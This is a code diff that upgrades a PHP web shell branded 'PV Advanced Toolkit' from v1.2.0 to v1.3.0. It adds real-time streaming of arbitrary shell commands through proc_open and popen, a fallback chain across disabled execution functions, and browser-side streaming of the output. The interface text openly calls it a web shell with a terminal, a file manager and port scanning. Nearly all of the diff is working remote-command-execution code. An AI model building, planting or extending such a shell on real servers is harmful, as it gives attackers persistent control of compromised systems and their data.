@@ -198,6 +198,93 @@ function execute_command_with_fallback($command) {
     return "[Error] All command execution backends (proc_open, popen, shell_exec, system, passthru, exec) are disabled or failed.";
 }
 
+/**
+ * NEW: Executes a shell command and streams the output in real-time.
+ * This is used for the terminal to prevent timeouts on long-running commands.
+ *
+ * @param string $command The command to execute.
+ */
+function stream_command($command) {
+    // Set headers to disable any server-side buffering
+    if (function_exists('apache_setenv')) {
+        @apache_setenv('no-gzip', 1);
+    }
+    @ini_set('zlib.output_compression', 0);
+    @ini_set('implicit_flush', 1);
+    @ob_end_clean(); // Clean any existing output buffers
+    ob_implicit_flush(1);
+    header('Content-Type: text/plain; charset=utf-8');
+    header('X-Content-Type-Options: nosniff');
+
+    // proc_open is the best choice for real-time I/O
+    if (is_callable_shell_func('proc_open')) {
+        $descriptorspec = [
+           0 => ["pipe", "r"],  // stdin
+           1 => ["pipe", "w"],  // stdout
+           2 => ["pipe", "w"]   // stderr
+        ];
+        $pipes = [];
+        $process = @proc_open($command, $descriptorspec, $pipes, $_SESSION['terminal_cwd']);
+
+        if (is_resource($process)) {
+            fclose($pipes[0]); // We don't need to write to stdin
+            stream_set_blocking($pipes[1], false);
+            stream_set_blocking($pipes[2], false);
+
+            while (true) {
+                $status = proc_get_status($process);
+                if (!$status['running']) {
+                    break; // Process has exited
+                }
+
+                // Read from stdout
+                $stdout = stream_get_contents($pipes[1]);
+                if ($stdout !== false && $stdout !== '') {
+                    echo $stdout;
+                    flush();
+                }
+
+                // Read from stderr
+                $stderr = stream_get_contents($pipes[2]);
+                if ($stderr !== false && $stderr !== '') {
+                    echo $stderr;
+                    flush();
+                }
+
+                usleep(50000); // 50ms delay to prevent high CPU usage in the loop
+            }
+
+            // Ensure we capture any final output
+            $stdout = stream_get_contents($pipes[1]);
+            if ($stdout) { echo $stdout; flush(); }
+            $stderr = stream_get_contents($pipes[2]);
+            if ($stderr) { echo $stderr; flush(); }
+
+            fclose($pipes[1]);
+            fclose($pipes[2]);
+            proc_close($process);
+            return;
+        }
+    }
+
+    // Fallback to popen which can also stream, though with less control
+    if (is_callable_shell_func('popen')) {
+        $handle = @popen($command . ' 2>&1', 'r');
+        if ($handle) {
+            while (!feof($handle)) {
+                $buffer = fread($handle, 4096);
+                echo $buffer;
+                flush();
+            }
+            @pclose($handle);
+            return;
+        }
+    }
+
+    // If no streaming functions are available, fall back to the old blocking method
+    echo execute_command_with_fallback($command);
+    flush();
+}
 
 function command_exists($command) {
     if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
@@ -599,11 +686,10 @@ function formatSizeUnits($bytes) {
 }
 
 if ($authenticated && isset($_POST['ajax_action'])) {
-    header('Content-Type: application/json');
-    $response = ['status' => 'error', 'message' => 'Invalid AJAX action.'];
-
+    // Session CWD should be honored for all ajax actions
     if (isset($_SESSION['terminal_cwd']) && is_dir($_SESSION['terminal_cwd'])) {
         if(!@chdir($_SESSION['terminal_cwd'])) {
+            // Fallback if chdir fails
             $_SESSION['terminal_cwd'] = getcwd();
             @chdir($_SESSION['terminal_cwd']);
         }
@@ -617,13 +703,15 @@ if ($authenticated && isset($_POST['ajax_action'])) {
         case 'execute_command':
             if (isset($_POST['command'])) {
                 $command = $_POST['command'];
-                $output = "";
-
-                if (preg_match('/^cd\s+(.+)/i', $command, $matches)) {
-                    $new_dir = trim($matches[1]);
-                    $new_dir_abs = '';
-
-                    if ($new_dir === '~' || $new_dir === '$HOME' || ($new_dir === '%USERPROFILE%' && DIRECTORY_SEPARATOR === '\\')) {
+                
+                // Route 'cd' commands to return JSON for CWD updates
+                if (preg_match('/^cd\s*(.*)/i', $command, $matches)) {
+                    header('Content-Type: application/json');
+                    $output = "";
+                    $new_dir_input = trim($matches[1]);
+                    
+                    // Handle plain 'cd' or 'cd ~' to go home
+                    if (empty($new_dir_input) || $new_dir_input === '~' || $new_dir_input === '$HOME' || ($new_dir_input === '%USERPROFILE%' && DIRECTORY_SEPARATOR === '\\')) {
                         $home_dir = getenv('HOME');
                         if (!$home_dir && DIRECTORY_SEPARATOR === '\\') $home_dir = getenv('USERPROFILE');
                         if ($home_dir && is_dir($home_dir)) {
@@ -632,20 +720,23 @@ if ($authenticated && isset($_POST['ajax_action'])) {
                             $output = "[Error] Could not determine home directory path.";
                             $new_dir_abs = false;
                         }
-                    } elseif (DIRECTORY_SEPARATOR === '\\') {
-                        if (preg_match('/^[a-zA-Z]:$/', $new_dir)) {
-                             $new_dir_abs = realpath($new_dir . '\\');
-                        } elseif (substr($new_dir, 1, 1) === ':') {
-                            $new_dir_abs = realpath($new_dir);
-                        } else {
-                            $new_dir_abs = realpath($current_ajax_cwd . DIRECTORY_SEPARATOR . $new_dir);
+                    } else { // Handle 'cd' with a path argument
+                        $new_dir = $new_dir_input;
+                        if (DIRECTORY_SEPARATOR === '\\') { // Windows-specific path handling
+                            if (preg_match('/^[a-zA-Z]:$/', $new_dir)) {
+                                 $new_dir_abs = realpath($new_dir . '\\');
+                            } elseif (substr($new_dir, 1, 1) === ':') {
+                                $new_dir_abs = realpath($new_dir);
+                            } else {
+                                $new_dir_abs = realpath($current_ajax_cwd . DIRECTORY_SEPARATOR . $new_dir);
+                            }
+                        } else { // Unix-like path handling
+                             if (substr($new_dir, 0, 1) !== '/') {
+                                $new_dir_abs = realpath($current_ajax_cwd . '/' . $new_dir);
+                             } else {
+                                $new_dir_abs = realpath($new_dir);
+                             }
                         }
-                    } else {
-                         if (substr($new_dir, 0, 1) !== '/') {
-                            $new_dir_abs = realpath($current_ajax_cwd . '/' . $new_dir);
-                         } else {
-                            $new_dir_abs = realpath($new_dir);
-                         }
                     }
 
                     if ($new_dir_abs && is_dir($new_dir_abs)) {
@@ -657,25 +748,26 @@ if ($authenticated && isset($_POST['ajax_action'])) {
                             $output = "[Error] Could not change directory to " . htmlspecialchars($new_dir_abs) . " (chdir failed, check permissions)";
                         }
                     } elseif ($new_dir_abs !== false) {
-                         if(empty($output)) $output = "[Error] Could not change directory to " . htmlspecialchars($new_dir) . " (path not found or not a directory)";
+                         if(empty($output)) $output = "[Error] Could not change directory to " . htmlspecialchars($new_dir_input) . " (path not found or not a directory)";
                     } else {
-                         if(empty($output)) $output = "[Error] Path does not exist: " . htmlspecialchars($new_dir);
+                         if(empty($output)) $output = "[Error] Path does not exist: " . htmlspecialchars($new_dir_input);
                     }
+                    echo json_encode(['status' => 'success', 'output' => $output, 'cwd' => $_SESSION['terminal_cwd']]);
+
                 } else {
-                    if ($command !== "") {
-                        $output = execute_command_with_fallback($command);
-                    } else {
-                        $output = "";
-                    }
+                    // For all other commands, use the new streaming function
+                    stream_command($command);
                 }
-                $response = ['status' => 'success', 'output' => trim($output ?? ''), 'cwd' => $_SESSION['terminal_cwd']];
             } else {
-                $response['message'] = 'No command provided.';
-                $response['cwd'] = $current_ajax_cwd;
+                header('Content-Type: application/json');
+                echo json_encode(['status' => 'error', 'message' => 'No command provided.', 'cwd' => $current_ajax_cwd]);
             }
+            exit; // IMPORTANT: Stop script execution after handling the action
             break;
 
         case 'get_file_listing':
+            header('Content-Type: application/json');
+            $response = ['status' => 'error', 'message' => 'Invalid AJAX action.'];
             $fm_path = $_POST['path'] ?? $current_ajax_cwd;
             $term_cwd_backup = getcwd();
 
@@ -683,7 +775,8 @@ if ($authenticated && isset($_POST['ajax_action'])) {
                 $response['message'] = 'Could not access path: ' . htmlspecialchars($fm_path);
                 $response['path'] = htmlspecialchars($term_cwd_backup);
                 @chdir($term_cwd_backup);
-                break;
+                echo json_encode($response);
+                exit;
             }
             $realPath = getcwd();
             $_SESSION['filemanager_cwd'] = $realPath;
@@ -693,7 +786,8 @@ if ($authenticated && isset($_POST['ajax_action'])) {
                 $response['message'] = 'Could not read directory: ' . htmlspecialchars($realPath);
                 $response['path'] = htmlspecialchars($realPath);
                 @chdir($term_cwd_backup);
-                break;
+                echo json_encode($response);
+                exit;
             }
 
             $dirs = []; $files_list = [];
@@ -815,7 +909,18 @@ if ($authenticated && isset($_POST['ajax_action'])) {
 
             $response = ['status' => 'success', 'files' => array_merge($dirs, $files_list), 'path' => htmlspecialchars($realPath)];
             @chdir($term_cwd_backup);
+            echo json_encode($response);
+            exit;
             break;
+    }
+
+    // Default JSON header for all other AJAX actions
+    header('Content-Type: application/json');
+    $response = ['status' => 'error', 'message' => 'Invalid AJAX action.'];
+
+    switch ($_POST['ajax_action']) {
+        // NOTE: 'execute_command' and 'get_file_listing' have been handled above and exit.
+        // The remaining cases are for other functionalities.
 
         case 'get_file_content':
             if (isset($_POST['path'])) {
@@ -1088,7 +1193,7 @@ if ($authenticated && isset($_POST['ajax_action'])) {
             }
             $response = ['status' => 'success', 'output' => $output];
             break;
-
+        
         default:
              $response['message'] = 'Unknown AJAX action: ' . htmlspecialchars($_POST['ajax_action']);
              break;
@@ -1146,7 +1251,7 @@ endif;
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Advanced Toolkit v1.2.0</title>
+    <title>Advanced Toolkit v1.3.0</title>
     <link rel="icon" href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZmlsbD0iIzBmZiIgZD0iTTEyIDJDNi40NzcgMiAyIDYuNDc3IDIgMTJzNC40NzcgMTAgMTAgMTAgMTAtNC40NzcgMTAtMTBTMTcuNTIzIDIgMTIgMnptMCAxOGMtNC40MTEgMC04LTMuNTg5LTgtOHMzLjU4OS04IDgtOCA4IDMuNTg5IDggOC0zLjU4OSA4LTggOHpNODUuNSAxMC41Yy44MjggMCAxLjUuNjcyIDEuNSAxLjVzLS42NzIgMS41LTEuNSAxLjVNNyAxMi44MjggNyAxMnMuNjcyLTEuNSAxLjUtMS41em03IDBjLjgyOCAwIDEuNS42NzIgMS41IDEuNXMwLS42NzIgMS41LTEuNSAxLjVTMTQgMTIuODI4IDE0IDEyczAuNjcyLTEuNSAxLjUtMS41em0tMy41IDRjLTIuMzMxIDAtNC4zMS0xLjQ2NS01LjExNi0zLjVoMTAuMjMyQzE2LjMxIDE2LjAzNSAxNC4zMzEgMTcuNSAxMiAxNy41eiIvPjwvc3ZnPg==">
     <link href="https://fonts.googleapis.com/css2?family=Orbitron&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
@@ -1234,7 +1339,7 @@ endif;
 <body>
     <div class="container">
         <header>
-            <h1>💀 PV Advanced Toolkit v1.2.0</h1>
+            <h1>💀 PV Advanced Toolkit v1.3.0</h1>
             <form method="post" class="logout-form">
                 <input type="hidden" name="action" value="logout">
                 <button type="submit">Logout</button>
@@ -1346,7 +1451,7 @@ endif;
                     <img src="https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExNjZwdGpicmw2bmZwcHpmcDg1ZGZuZ2t5cWh1cGI0Y2lzdDB6aGh0ZCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9cw/xxlo1yG0pvhJqNhhtj/giphy.gif" alt="Toolkit GIF" style="width: 200px; height: 200px; margin-right: 20px; border-radius: 5px; flex-shrink: 0;">
                     <div style="flex-grow: 1;">
                         <h2>About PV Advanced Toolkit</h2>
-                        <p><strong>Version:</strong> 1.2.0</p>
+                        <p><strong>Version:</strong> 1.3.0</p>
                         <p>This toolkit is a comprehensive PHP-based web shell and server management interface, designed for server administrators and security professionals for system inspection, management, and basic network operations.</p>
                     </div>
                 </div>
@@ -1358,7 +1463,8 @@ endif;
                     <li><strong>Interactive Terminal Emulator:</strong>
                         <ul>
                             <li>Execute shell commands directly on the server.</li>
-                            <li>Supports command history navigation with Up/Down arrow keys.</li>
+                            <li><strong>NEW:</strong> Support for long-running commands (e.g., scripts, network tasks) via real-time output streaming, preventing AJAX timeouts.</li>
+                            <li>Command history navigation with Up/Down arrow keys.</li>
                             <li>Maintains current working directory per session.</li>
                             <li>Renders HTML from server errors (e.g. 500) directly in the terminal view.</li>
                         </ul>
@@ -1398,7 +1504,7 @@ endif;
                             <li>Custom, non-blocking alert messages for operation feedback.</li>
                         </ul>
                     </li>
-                     <li><strong>Error Handling & Logging:</strong> Basic error logging to `error_log.txt` for troubleshooting.</li>
+                     <li><strong>Error Handling & Logging:</strong> Basic error logging to `pv-error_log` for troubleshooting.</li>
                 </ul>
                 <p><em>Disclaimer: This tool provides powerful server access. Use responsibly and ensure it is adequately secured. The developer is not responsible for any misuse.</em></p>
             </div>
@@ -1581,23 +1687,69 @@ document.addEventListener('DOMContentLoaded', function() {
             iframe.srcdoc = text;
             line.appendChild(iframe);
         } else if (type === 'prompt') {
-            const newPromptHtml = `${htmlEntities(currentTerminalCwd)}&gt; `;
-            if (terminalOutput.lastChild && terminalOutput.lastChild.classList && terminalOutput.lastChild.classList.contains('prompt-container')) {
+            const newPromptHtml = `<span class="prompt">${htmlEntities(currentTerminalCwd)}&gt; </span>`;
+            // Check if the last element is already a prompt container and update it. Otherwise, create a new one.
+            // This is to handle the initial prompt display correctly.
+            if (terminalOutput.lastChild && terminalOutput.lastChild.classList.contains('prompt-container')) {
                  terminalOutput.lastChild.innerHTML = newPromptHtml;
             } else {
                  line.className = 'prompt-container';
                  line.innerHTML = newPromptHtml;
                  terminalOutput.appendChild(line);
             }
-             terminalOutput.scrollTop = terminalOutput.scrollHeight;
+            terminalOutput.scrollTop = terminalOutput.scrollHeight;
             return;
         }
         else {
-            line.innerHTML = text; // Allow HTML for port scan results
+            line.innerHTML = text; // Allow HTML for things like port scan results
         }
         terminalOutput.appendChild(line);
         terminalOutput.scrollTop = terminalOutput.scrollHeight;
     }
+
+    /**
+     * NEW: Executes a command and streams the output to the terminal in real-time.
+     */
+    async function streamCommand(command) {
+        const outputContainer = document.createElement('div');
+        terminalOutput.appendChild(outputContainer);
+
+        try {
+            const formData = new FormData();
+            formData.append('ajax_action', 'execute_command');
+            formData.append('command', command);
+
+            const response = await fetch('<?php echo $_SERVER['PHP_SELF']; ?>', {
+                method: 'POST',
+                body: formData
+            });
+
+            if (!response.ok) {
+                const errorText = await response.text();
+                throw new Error(`HTTP error ${response.status}: ${errorText}`);
+            }
+
+            const reader = response.body.getReader();
+            const decoder = new TextDecoder();
+
+            while (true) {
+                const { done, value } = await reader.read();
+                if (done) {
+                    break;
+                }
+                const chunk = decoder.decode(value, { stream: true });
+                // Append received text chunk to the container
+                outputContainer.textContent += chunk;
+                terminalOutput.scrollTop = terminalOutput.scrollHeight;
+            }
+
+        } catch (error) {
+            outputContainer.className = 'error';
+            outputContainer.textContent = `[Stream Error] ${error.message}`;
+            terminalOutput.scrollTop = terminalOutput.scrollHeight;
+        }
+    }
+
 
     commandInput.addEventListener('keypress', async function(e) {
         if (e.key === 'Enter') {
@@ -1609,33 +1761,34 @@ document.addEventListener('DOMContentLoaded', function() {
                 appendToTerminalOutput("", 'prompt');
                 return;
             }
-            if (commandText) {
-                commandHistory.unshift(commandText);
-                if (commandHistory.length > 50) commandHistory.pop();
-                historyIndex = -1;
-            }
+
+            commandHistory.unshift(commandText);
+            if (commandHistory.length > 50) commandHistory.pop();
+            historyIndex = -1;
+
+            appendToTerminalOutput(commandText, 'input-command');
 
             if (commandText.toLowerCase() === 'clear') {
                 terminalOutput.innerHTML = '';
-                appendToTerminalOutput(`Terminal cleared.`, 'info');
-                appendToTerminalOutput("", 'prompt');
-                return;
-            }
-
-            appendToTerminalOutput(commandText, 'input-command');
-            const result = await sendAjaxRequest('execute_command', { command: commandText });
-
-            if (result.status === 'success') {
-                if(result.output) appendToTerminalOutput(result.output);
-                 if(result.cwd) currentTerminalCwd = result.cwd;
-            } else if (result.status === 'html_error') {
-                 appendToTerminalOutput(result.content, 'html_error');
+                appendToTerminalOutput('Terminal cleared.', 'info');
+            } else if (commandText.trim().toLowerCase().startsWith('cd')) {
+                // Use old JSON-based request for 'cd' to get CWD update
+                const result = await sendAjaxRequest('execute_command', { command: commandText });
+                if (result.status === 'success' && result.output) {
+                    appendToTerminalOutput(result.output);
+                } else if (result.status !== 'success') {
+                    appendToTerminalOutput(result.message || 'Error executing command.', 'error');
+                }
+                // CWD is updated globally by sendAjaxRequest
             } else {
-                appendToTerminalOutput(result.message || 'Error executing command.', 'error');
+                // Use new streaming fetch for all other commands
+                await streamCommand(commandText);
             }
+
             appendToTerminalOutput("", 'prompt');
         }
     });
+
 
     commandInput.addEventListener('keydown', function(e) {
         if (e.key === 'ArrowUp') {
@@ -1656,11 +1809,9 @@ document.addEventListener('DOMContentLoaded', function() {
         }
     });
 
-
     if (document.getElementById('terminal').classList.contains('active')) {
         appendToTerminalOutput("", 'prompt');
     }
-
 
     async function fetchFiles(path) {
         pathInput.value = path;
